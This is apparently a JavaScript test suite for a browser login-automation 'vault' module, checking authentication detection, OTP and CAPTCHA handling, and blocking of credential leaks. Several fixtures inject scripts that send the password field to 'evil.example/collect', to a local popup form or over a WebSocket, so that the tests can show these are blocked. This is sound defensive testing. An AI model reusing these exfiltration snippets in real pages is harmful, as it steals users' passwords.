import test from 'node:test';
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {chromium} from 'playwright-core';
import {vaultBrowserAction,prepareVaultContext} from '../src/vault-browser.mjs';

async function fixture(fn){
 const server=createServer((req,res)=>{if(req.url==='/authenticated'){res.setHeader('content-type','text/html');res.end('<script>window.SiteStatus={isLogin:true,userCode:"user"}</script>');return}if(req.url.startsWith('/api/v2/user/signon')){res.writeHead(401,{'content-type':'application/json'});res.end(JSON.stringify({errorCode:'username_password_not_match'}));return}res.setHeader('content-type','text/html');res.end('fixture')});await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`;
 const browser=await chromium.launch({executablePath:process.env.COKE_CHROMIUM_PATH||'/usr/bin/chromium-browser',args:['--no-sandbox']});const page=await browser.newPage();await page.goto(origin);
 try{await fn(page,origin)}finally{await browser.close();await new Promise(r=>server.close(r))}
}
const form=`<input placeholder="Email"><input id="password" name="password" type="password"><button>Sign In</button>`;
test('positive server SiteStatus is required; URL-only and empty passwords are not authentication',()=>fixture(async(page,origin)=>{
 await page.setContent(form);assert.deepEqual(await vaultBrowserAction(page,{action:'status'},{origin,fixture:true}),{status:'login_required'});
 await page.evaluate(()=>{window.SiteStatus={isLogin:true,userCode:'fixture-user'}});assert.deepEqual(await vaultBrowserAction(page,{action:'status'},{origin,fixture:true}),{status:'authenticated'});
}));
test('real form login and invalid credentials return only fixed statuses',()=>fixture(async(page,origin)=>{
 await page.setContent(form+`<script>document.querySelector('button').onclick=()=>fetch('/api/v2/user/signon',{method:'POST',body:JSON.stringify({username:document.querySelector('input').value,password:document.querySelector('#password').value})})</script>`);
 const result=await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true});assert.deepEqual(result,{status:'invalid_credentials'});
 await page.unroute('**/api/v2/user/signon*');await page.evaluate(()=>document.querySelector('button').onclick=()=>{window.SiteStatus={isLogin:true,userCode:'user'}});
 assert.deepEqual(await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true}),{status:'authenticated'});
}));
test('known OTP input supports transient code; CAPTCHA is unsupported',()=>fixture(async(page,origin)=>{
 await page.setContent('<input name="code" autocomplete="one-time-code" type="text" placeholder="Verification Code"><button>Verification</button><script>document.querySelector("button").onclick=()=>{window.SiteStatus={isLogin:true,userCode:"u"}}</script>');
 assert.deepEqual(await vaultBrowserAction(page,{action:'status'},{origin,fixture:true}),{status:'code_required'});
 assert.deepEqual(await vaultBrowserAction(page,{action:'code',code:'123456'},{origin,fixture:true}),{status:'authenticated'});
 await page.evaluate(()=>delete window.SiteStatus);await page.setContent('<iframe src="about:blank" title="reCAPTCHA"></iframe>');assert.deepEqual(await vaultBrowserAction(page,{action:'status'},{origin,fixture:true}),{status:'verification_required'});
}));
test('rejects changed origin and blocks credential POST exfiltration',()=>fixture(async(page,origin)=>{
 await page.setContent(form+`<script>document.querySelector('button').onclick=()=>fetch('https://evil.example/collect',{method:'POST',body:document.querySelector('#password').value})</script>`);
 let delivered=0;page.context().on('requestfinished',request=>{if(request.url().startsWith('https://evil.example/'))delivered++});
 const result=await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true});assert.deepEqual(result,{status:'verification_required'});assert.equal(delivered,0);
 assert.deepEqual(await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin:'https://ticktick.com'}),{status:'verification_required'});
}));
test('blocked analytics does not invalidate independently positive authentication',()=>fixture(async(page,origin)=>{
 await page.setContent(form+`<script>document.querySelector('button').onclick=()=>{fetch('https://analytics.example/collect').catch(()=>{});setTimeout(()=>{window.SiteStatus={isLogin:true,userCode:'user'}},100)}</script>`);
 assert.deepEqual(await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true}),{status:'authenticated'});
}));
test('only exact public static CDN reads without credentials are permitted',async()=>{
 let handler;const context={route:async(_pattern,fn)=>{handler=fn},routeWebSocket:async()=>{},on(){}};const page={context:()=>context,url:()=> 'https://ticktick.com/signin',evaluate:async()=> 'login_required'};
 assert.deepEqual(await vaultBrowserAction(page,{action:'status',password:'private-secret'},{origin:'https://ticktick.com'}),{status:'login_required'});
 const check=async(url,method='GET',body=null)=>{let result;await handler({request:()=>({url:()=>url,method:()=>method,postData:()=>body}),continue:async()=>{result='allowed'},abort:async()=>{result='blocked'}});return result};
 assert.equal(await check('https://d107mjio2rjf74.cloudfront.net/web/static/build/sites/userSign/bundle.ap-67a0c8713b2f3dc10d5e.js'),'allowed');
 for(const url of ['https://evil.example/web/static/a.js','https://d107mjio2rjf74.cloudfront.net/collect','https://d107mjio2rjf74.cloudfront.net/web/static/a.js?secret=1','https://d107mjio2rjf74.cloudfront.net/web/static/private-secret.js'])assert.equal(await check(url),'blocked');
 assert.equal(await check('https://d107mjio2rjf74.cloudfront.net/web/static/a.js','POST','private-secret'),'blocked');
});
test('target blank form cannot send credentials from initial popup request',()=>fixture(async(page,origin)=>{
 let delivered=0;const receiver=createServer((req,res)=>{if(req.method==='POST')delivered++;res.end('received')});await new Promise(r=>receiver.listen(0,'127.0.0.1',r));
 try{await page.setContent(`<form target="_blank" method="POST" action="http://127.0.0.1:${receiver.address().port}/collect">${form.replace('<input placeholder="Email">','<input name="email" placeholder="Email">')}</form>`);
 const result=await vaultBrowserAction(page,{action:'login',email:'test@example.com',password:'secret-password'},{origin,fixture:true});assert.equal(delivered,0);assert.deepEqual(result,{status:'verification_required'});
 }finally{receiver.closeAllConnections();await new Promise(r=>receiver.close(r))}
}));

test('prepare context blocks WebSocket created by initial login document before secret fill',async()=>{
 let upgrades=0;const receiver=createServer();receiver.on('upgrade',(req,socket)=>{upgrades++;socket.destroy()});await new Promise(r=>receiver.listen(0,'127.0.0.1',r));
 const server=createServer((req,res)=>{res.setHeader('content-type','text/html');res.end(form+`<script>window.ws=new WebSocket('ws://127.0.0.1:${receiver.address().port}/collect');document.querySelector('button').onclick=()=>{if(ws.readyState===1)ws.send(document.querySelector('#password').value);window.SiteStatus={isLogin:true,userCode:'user'}}</script>`)});await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`;
 const browser=await chromium.launch({executablePath:process.env.COKE_CHROMIUM_PATH||'/usr/bin/chromium-browser',args:['--no-sandbox']});
 try{const context=await browser.newContext({serviceWorkers:'block'});await prepareVaultContext(context,{origin,fixture:true});const page=await context.newPage();await page.goto(origin);await page.waitForTimeout(100);
 assert.equal(upgrades,0);assert.deepEqual(await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true}),{status:'authenticated'});assert.equal(upgrades,0);
 }finally{await browser.close();server.closeAllConnections();receiver.closeAllConnections();await new Promise(r=>server.close(r));await new Promise(r=>receiver.close(r))}
});

test('same-origin navigation during login waits for positive authenticated document',()=>fixture(async(page,origin)=>{
 await page.setContent(form+`<script>document.querySelector('button').onclick=()=>location.href='/authenticated'</script>`);
 assert.deepEqual(await vaultBrowserAction(page,{action:'login',email:'private@example.com',password:'secret-password'},{origin,fixture:true}),{status:'authenticated'});
}));
test('silent Vault account switch ignores saved account A and authenticates supplied account B',async()=>{
 const {mkdtemp,rm}=await import('node:fs/promises');const {join}=await import('node:path');const {tmpdir}=await import('node:os');const {ProfileStore}=await import('../src/profile-store.mjs');const {createLoginManager}=await import('../src/login-manager.mjs');const {createCapacity}=await import('../src/online-task-manager.mjs');
 let signons=0,submitted;const server=createServer(async(req,res)=>{
  res.setHeader('content-type','text/html');
  if(req.url==='/api/v2/user/signon'){let body='';for await(const chunk of req)body+=chunk;submitted=JSON.parse(body);signons++;res.setHeader('set-cookie','sid=account-B; Path=/; HttpOnly');res.setHeader('content-type','application/json');res.end('{}');return}
  const sid=/sid=account-([AB])/.exec(req.headers.cookie||'')?.[1];if(sid){res.end(`<script>window.SiteStatus={isLogin:true,userCode:'account-${sid}'}</script>`);return}
  res.end(form+`<script>document.querySelector('button').onclick=async()=>{await fetch('/api/v2/user/signon',{method:'POST',body:JSON.stringify({email:document.querySelector('[placeholder=Email]').value,password:document.querySelector('#password').value})});location.href='/webapp'}</script>`);
 });await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`,dir=await mkdtemp(join(tmpdir(),'vault-account-switch-')),descriptor={name:'ticktick',origin},store=new ProfileStore(join(dir,'profiles'));const loaded=await store.load('alice',descriptor);await store.save('alice',descriptor,{cookies:[{name:'sid',value:'account-A',domain:'127.0.0.1',path:'/',expires:-1,httpOnly:true,secure:false,sameSite:'Lax'}],origins:[{origin,localStorage:[{name:'old-account',value:'A'}]}]},loaded.generation);
 const manager=createLoginManager({dataDir:dir,capacity:createCapacity(),allowedOrigins:[origin]});const call=(path,body)=>manager.handle({method:'POST',path,userId:'alice',body});
 try{const created=await call('/v1/logins',{url:origin+'/signin',profile:'ticktick',silent:true});assert.equal(created.status,201);const path='/v1/logins/'+created.body.id;
  assert.deepEqual((await call(path+'/vault',{action:'status'})).body,{status:'login_required'});
  assert.deepEqual((await call(path+'/vault',{action:'login',email:'account-B@example.com',password:'B-password'})).body,{status:'authenticated'});assert.equal(signons,1);assert.deepEqual(submitted,{email:'account-B@example.com',password:'B-password'});
  assert.equal((await call(path+'/confirm')).body.status,'saved');const saved=await store.load('alice',descriptor);assert.equal(saved.state.cookies.find(c=>c.name==='sid').value,'account-B');assert.deepEqual(saved.state.origins.flatMap(o=>o.localStorage),[]);
 }finally{await manager.close();server.closeAllConnections();await new Promise(r=>server.close(r));await rm(dir,{recursive:true,force:true})}
});

test('authenticated webapp profile response works without legacy SiteStatus; URL and MFA alone do not',async()=>{
 let mode='valid';const server=createServer((req,res)=>{if(req.url==='/api/v2/user/profile'){res.writeHead(mode==='unauthorized'?401:200,{'content-type':'application/json'});res.end(JSON.stringify(mode==='mfa'?{authId:'not-authenticated'}:{userCode:'fixture-user',username:'fixture@example.com'}));return}res.setHeader('content-type','text/html');if(req.url==='/webapp/'){res.end(`<script>fetch('/api/v2/user/profile')</script><h1>App</h1>`);return}res.end(form+`<script>document.querySelector('button').onclick=()=>location.href='/webapp/'</script>`)});await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`;const browser=await chromium.launch({executablePath:process.env.COKE_CHROMIUM_PATH||'/usr/bin/chromium-browser',args:['--no-sandbox']});
 try{for(const variant of ['valid','unauthorized','mfa']){mode=variant;const context=await browser.newContext({serviceWorkers:'block'});await prepareVaultContext(context,{origin,fixture:true});const page=await context.newPage();await page.goto(origin);const result=await vaultBrowserAction(page,{action:'login',email:'fixture@example.com',password:'fixture-password'},{origin,fixture:true});assert.equal(result.status,variant==='valid'?'authenticated':'pending');await context.close()}}finally{await browser.close();server.closeAllConnections();await new Promise(r=>server.close(r))}
});
